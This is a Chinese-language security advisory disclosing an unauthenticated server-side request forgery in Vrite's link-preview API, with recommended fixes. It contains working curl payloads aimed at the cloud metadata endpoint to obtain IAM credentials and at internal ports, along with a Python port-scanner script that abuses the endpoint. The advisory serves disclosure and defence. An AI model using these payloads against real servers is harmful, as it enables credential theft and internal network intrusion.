# VRITE-2025-001: 未认证 SSRF via Link Preview

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [vriteio/vrite](https://github.com/vriteio/vrite) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) |
| **CWE** | CWE-918 (Server-Side Request Forgery) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/未认证 |

## 漏洞概述

Vrite 的 Link Preview API 端点 (`utils.linkPreview`) 允许**未认证用户**提供任意 URL，服务器会对该 URL 发起 HTTP 请求获取 Open Graph 元数据。

该端点：
1. **不需要认证**（使用 `procedure` 而非 `authenticatedProcedure`）
2. **不做 URL 校验**（无内网地址检测、无协议限制）
3. **返回部分响应内容**（标题、描述、图片 URL）

攻击者可以利用此端点：
- 扫描内网服务和端口
- 读取云元数据 API（AWS/GCP/Azure 实例凭证）
- 探测内网拓扑
- 发起对任意 URL 的请求（匿名代理）

## 漏洞代码

**文件**: `packages/backend/src/routes/utils/index.ts`

```typescript
const utilsRouter = router({
  // ...
  linkPreview: procedure                    // ← 使用 procedure（不需要认证！）
    .input(getLinkPreview.inputSchema)       //    对比: authenticatedProcedure
    .output(getLinkPreview.outputSchema)
    .query(async ({ ctx, input }) => {
      return getLinkPreview.handler(ctx, input);
    }),
  // ...
});
```

**文件**: `packages/backend/src/routes/utils/handlers/link-preview.ts`

```typescript
const inputSchema = z.object({
  url: z.string().describe("URL to fetch preview data for"),   // ← 只验证是 string
  variantId: zodId().optional(),
  workspaceId: zodId().optional()
});

const handler = async (ctx, input) => {
  // 对于外部 URL：
  try {
    const data = await ogs({
      url: input.url       // ← 用户 URL 直接传给 open-graph-scraper
    });
    // ...
    return {
      image: ...,
      icon: data.result.favicon || "",
      description: data.result.ogDescription || "",
      title: data.result.ogTitle || "",
      url: data.result.requestUrl,
      type: "external"
    };
  } catch (error) {
    throw errors.serverError();
  }
};
```

**关键证据**：整个 backend 代码库中**没有任何** private IP 检测逻辑：
```bash
$ grep -rn "isPrivate\|isInternal\|localhost\|127\.0\.0\|169\.254" packages/backend/src --include="*.ts"
# (empty output)
```

## PoC (概念验证)

### 前提

Vrite 使用 tRPC，API 调用格式为 HTTP GET with query params。

```bash
# Vrite 默认运行在 http://localhost:4000

# 攻击1: 读取 AWS 元数据（未认证！）
curl "http://target-vrite.com/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F%22%7D"

# URL decode: {"url":"http://169.254.169.254/latest/meta-data/"}

# 攻击2: 扫描内网端口
curl "http://target-vrite.com/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2F10.0.0.1%3A6379%2F%22%7D"

# 攻击3: 探测内部服务
curl "http://target-vrite.com/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2Flocalhost%3A27017%2F%22%7D"

# 攻击4: 匿名代理（让 Vrite 替你访问外部站点）
curl "http://target-vrite.com/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2Fvictim-site.com%2Fsensitive-page%22%7D"
```

### 响应格式

即使目标不是标准网页，`open-graph-scraper` 仍然会尝试解析 HTML：
- 如果目标返回 HTML，标题/描述会泄露
- 如果超时或非 HTML，服务器返回 500 — 可以用来做端口扫描（区分开放/关闭）

## 影响

| 攻击场景 | 影响 |
|----------|------|
| AWS/GCP 元数据 | 获取实例凭证、API 密钥 |
| 内网扫描 | 发现内部服务拓扑 |
| 端口探测 | 通过响应时间/错误区分端口状态 |
| 匿名代理 | 用 Vrite 服务器的 IP 访问第三方 |
| DoS | 指向大文件 URL 消耗带宽/内存 |

## 本地复现步骤

### 环境搭建

```bash
# 克隆 Vrite
git clone https://github.com/vriteio/vrite.git
cd vrite

# 安装依赖
pnpm install

# 设置环境变量（需要 MongoDB）
cp apps/backend/.env.example apps/backend/.env
# 编辑 .env 配置 MongoDB 连接

# 启动 backend
pnpm --filter @vrite/backend dev
# 默认运行在 http://localhost:4000
```

### 复现 SSRF

```bash
# Step 1: 确认 linkPreview 端点可达（无需认证）
curl -s "http://localhost:4000/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2Fexample.com%22%7D"

# 预期输出（成功获取 example.com 的 OG 数据）：
# {"result":{"data":{"image":"","icon":"","description":"...","title":"Example Domain","url":"http://example.com","type":"external"}}}

# Step 2: 测试内网访问
# 先启动一个本地 listener
python3 -m http.server 9999 &

curl -s "http://localhost:4000/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2F127.0.0.1%3A9999%2Fssrf-poc%22%7D"

# listener 输出应显示来自 Vrite backend 的请求：
# 127.0.0.1 - - [DATE] "GET /ssrf-poc HTTP/1.1" 404 -

# Step 3: 测试 AWS metadata（如果在 EC2 上部署）
curl -s "http://localhost:4000/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F%22%7D"

# Step 4: 端口扫描对比
# 开放端口（快速返回）
time curl -s "http://localhost:4000/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2F127.0.0.1%3A4000%2F%22%7D"

# 关闭端口（超时后返回错误）
time curl -s "http://localhost:4000/api/utils.linkPreview?input=%7B%22url%22%3A%22http%3A%2F%2F127.0.0.1%3A9999%2F%22%7D"
```

### 自动化扫描脚本

```python
#!/usr/bin/env python3
"""Vrite SSRF Port Scanner PoC"""
import requests
import time
import json
import urllib.parse

VRITE_URL = "http://localhost:4000"
TARGET_HOST = "127.0.0.1"
PORTS = [22, 80, 443, 3000, 3306, 5432, 6379, 8080, 9200, 27017]

for port in PORTS:
    url = f"http://{TARGET_HOST}:{port}/"
    payload = json.dumps({"url": url})
    encoded = urllib.parse.quote(payload)
    
    start = time.time()
    try:
        r = requests.get(f"{VRITE_URL}/api/utils.linkPreview?input={encoded}", timeout=5)
        elapsed = time.time() - start
        status = "OPEN" if r.status_code == 200 or elapsed < 2 else "FILTERED"
    except:
        elapsed = time.time() - start
        status = "CLOSED" if elapsed < 1 else "FILTERED"
    
    print(f"  Port {port:5d}: {status} ({elapsed:.2f}s)")
```

### 关键观察点

| 检查项 | 状态 |
|--------|------|
| 需要认证? | ❌ 不需要（`procedure` vs `authenticatedProcedure`） |
| URL 白名单? | ❌ 无 |
| 内网地址检测? | ❌ 无 |
| 协议限制? | ❌ 无（取决于 open-graph-scraper 底层） |
| 响应数据泄露? | ⚠️ 部分（title, description, image URL） |
| Rate limit? | ❌ 此端点无速率限制 |

## 修复建议

### 方案1（推荐）：添加认证 + URL 校验

```typescript
// 1. 改为需要认证
linkPreview: authenticatedProcedure    // ← 改为 authenticatedProcedure
  .input(...)
  .output(...)
  .query(...)

// 2. 添加 URL 校验
import { isPrivateIP } from 'some-ip-validation-lib';
import dns from 'dns/promises';

async function validateUrl(url: string): Promise<void> {
  const parsed = new URL(url);
  
  // 只允许 http/https
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP/HTTPS protocols allowed');
  }
  
  // DNS 解析后检查是否为私有 IP
  const addresses = await dns.resolve4(parsed.hostname);
  for (const addr of addresses) {
    if (isPrivateIP(addr)) {
      throw new Error('Private/internal addresses are not allowed');
    }
  }
}
```

### 方案2：使用 ssrf-req-filter

```typescript
import { createAgent } from 'ssrf-req-filter';

const data = await ogs({
  url: input.url,
  fetchOptions: {
    agent: createAgent()  // 自动阻止内网请求
  }
});
```

## 参考

- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [open-graph-scraper security considerations](https://github.com/jshemas/openGraphScraper)
